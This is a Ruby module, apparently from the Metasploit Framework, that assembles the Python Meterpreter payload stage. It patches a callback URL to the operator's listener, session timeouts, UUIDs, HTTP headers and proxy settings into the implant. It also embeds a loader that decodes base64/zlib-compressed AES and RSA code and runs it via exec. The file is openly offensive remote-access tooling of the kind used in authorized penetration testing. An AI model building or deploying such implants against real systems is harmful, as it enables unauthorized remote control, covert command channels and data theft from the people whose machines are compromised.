# -*- coding: binary -*-


module Msf

###
#
# Common module stub for ARCH_PYTHON payloads that make use of Meterpreter.
#
###

module Payload::Python::MeterpreterLoader

  include Msf::Payload::Python
  include Msf::Payload::UUID::Options
  include Msf::Payload::TransportConfig
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration',
      'Description'   => 'Run Meterpreter & the configuration stub',
      'Author'        => [ 'Spencer McIntyre' ],
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Stager'        => {'Payload' => ""}
    ))

    register_advanced_options(
      [
        OptBool.new(
          'MeterpreterTryToFork',
          'Fork a new process if the functionality is available',
          default: true
        ),
        OptBool.new(
          'MeterpreterDebugBuild',
          'Enable debugging for the Python meterpreter',
          aliases: ['PythonMeterpreterDebug']
        )
      ] +
      Msf::Opt::http_header_options
    )
  end

  def stage_payload(opts={})
    Rex::Text.encode_base64(Rex::Text.zlib_deflate(stage_meterpreter(opts)))
  end

  # Get the raw Python Meterpreter stage and patch in values based on the
  # configuration
  #
  # @param opts [Hash] The options to use for patching the stage data.
  # @option opts [String] :http_proxy_host The host to use as a proxy for
  #   HTTP(S) transports.
  # @option opts [String] :http_proxy_port The port to use when a proxy  host is
  #   set for HTTP(S) transports.
  # @option opts [String] :url The HTTP(S) URL to patch in to
  #   allow use of the stage as a stageless payload.
  # @option opts [String] :http_user_agent The value to use for the User-Agent
  #   header for HTTP(S) transports.
  # @option opts [String] :stageless_tcp_socket_setup Python code to execute to
  #   setup a tcp socket to allow use of the stage as a stageless payload.
  # @option opts [String] :uuid A specific UUID to use for sessions created by
  #   this stage.
  def stage_meterpreter(opts={})
    ds = opts[:datastore] || datastore
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.py')

    var_escape = lambda { |txt|
      txt.gsub('\\', '\\' * 8).gsub('\'', %q(\\\\\\\'))
    }

    if ds['MeterpreterDebugBuild']
      met.sub!(%q|DEBUGGING = False|, %q|DEBUGGING = True|)

      logging_options = Msf::OptMeterpreterDebugLogging.parse_logging_options(ds['MeterpreterDebugLogging'])
      met.sub!(%q|DEBUGGING_LOG_FILE_PATH = None|, %Q|DEBUGGING_LOG_FILE_PATH = "#{logging_options[:rpath]}"|) if logging_options[:rpath]
    end

    unless ds['MeterpreterTryToFork']
      met.sub!('TRY_TO_FORK = True', 'TRY_TO_FORK = False')
    end

    met.sub!("# PATCH-SETUP-ENCRYPTION #", python_encryptor_loader)

    met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{ds['SessionExpirationTimeout']}")
    met.sub!('SESSION_COMMUNICATION_TIMEOUT = 300', "SESSION_COMMUNICATION_TIMEOUT = #{ds['SessionCommunicationTimeout']}")
    met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{ds['SessionRetryTotal']}")
    met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{ds['SessionRetryWait']}")

    uuid = opts[:uuid] || generate_payload_uuid(arch: ARCH_PYTHON, platform: 'python')
    uuid = Rex::Text.to_hex(uuid.to_raw, prefix = '')
    met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")

    if opts[:stageless] == true
      session_guid = '00' * 16
    else
      session_guid = SecureRandom.uuid.gsub(/-/, '')
    end
    met.sub!("SESSION_GUID = \'\'", "SESSION_GUID = \'#{session_guid}\'")

    http_user_agent = opts[:http_user_agent] || ds['HttpUserAgent']
    http_proxy_host = opts[:http_proxy_host] || ds['HttpProxyHost'] || ds['PROXYHOST']
    http_proxy_port = opts[:http_proxy_port] || ds['HttpProxyPort'] || ds['PROXYPORT']
    http_proxy_user = opts[:http_proxy_user] || ds['HttpProxyUser']
    http_proxy_pass = opts[:http_proxy_pass] || ds['HttpProxyPass']
    http_header_host = opts[:header_host] || ds['HttpHostHeader']
    http_header_cookie = opts[:header_cookie] || ds['HttpCookie']
    http_header_referer = opts[:header_referer] || ds['HttpReferer']

    # The callback URL can be different to the one that we're receiving from the interface
    # so we need to generate it
    # TODO: move this to somewhere more common so that it can be used across payload types
    unless opts[:url].to_s == ''

      # Build the callback URL (TODO: share this logic with TransportConfig
      uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
      opts[:scheme] ||= opts[:url].to_s.split(':')[0]
      scheme, lhost, lport = transport_uri_components(opts)
      callback_url = "#{scheme}://#{lhost}:#{lport}#{luri}#{uri}/"

      # patch in the various payload related configuration
      met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(callback_url)}'")
      met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(http_user_agent)}'") if http_user_agent.to_s != ''
      met.sub!('HTTP_COOKIE = None', "HTTP_COOKIE = '#{var_escape.call(http_header_cookie)}'") if http_header_cookie.to_s != ''
      met.sub!('HTTP_HOST = None', "HTTP_HOST = '#{var_escape.call(http_header_host)}'") if http_header_host.to_s != ''
      met.sub!('HTTP_REFERER = None', "HTTP_REFERER = '#{var_escape.call(http_header_referer)}'") if http_header_referer.to_s != ''

      if http_proxy_host.to_s != ''
        http_proxy_url = "http://"
        unless http_proxy_user.to_s == '' && http_proxy_pass.to_s == ''
          http_proxy_url << "#{Rex::Text.uri_encode(http_proxy_user)}:#{Rex::Text.uri_encode(http_proxy_pass)}@"
        end
        http_proxy_url << (Rex::Socket.is_ipv6?(http_proxy_host) ? "[#{http_proxy_host}]" : http_proxy_host)
        http_proxy_url << ":#{http_proxy_port}"

        met.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(http_proxy_url)}'")
      end
    end

    # patch in any optional stageless tcp socket setup
    unless opts[:stageless_tcp_socket_setup].nil?
      offset_string = ""
      /(?<offset_string>\s+)# PATCH-SETUP-STAGELESS-TCP-SOCKET #/ =~ met
      socket_setup = opts[:stageless_tcp_socket_setup]
      socket_setup = socket_setup.split("\n")
      socket_setup.map! {|line| "#{offset_string}#{line}\n"}
      socket_setup = socket_setup.join
      met.sub!("#{offset_string}# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
    end

    met
  end

  def python_encryptor_loader
    aes_encryptor = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_aes_source))
    rsa_encryptor = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_rsa_source))
    %Q?
import codecs,base64,zlib
try:
    from importlib.util import spec_from_loader
    def new_module(name):
        return spec_from_loader(name, loader=None)
except ImportError:
    import imp
    new_module = imp.new_module
met_aes = new_module('met_aes')
met_rsa = new_module('met_rsa')
exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{aes_encryptor}')[0])),'met_aes','exec'), met_aes.__dict__)
exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{rsa_encryptor}')[0])),'met_rsa','exec'), met_rsa.__dict__)
sys.modules['met_aes'] = met_aes
sys.modules['met_rsa'] = met_rsa
import met_rsa, met_aes
def met_rsa_encrypt(der, msg):
    return met_rsa.rsa_enc(der, msg)
def met_aes_encrypt(key, iv, pt):
    return met_aes.AESCBC(key).encrypt(iv, pt)
def met_aes_decrypt(key, iv, pt):
    return met_aes.AESCBC(key).decrypt(iv, pt)
    ?
  end

  def python_rsa_source
    File.read(File.join(Msf::Config.data_directory, 'meterpreter', 'python', 'met_rsa.py'))
  end

  def python_aes_source
    File.read(File.join(Msf::Config.data_directory, 'meterpreter', 'python', 'met_aes.py'))
  end
end

end
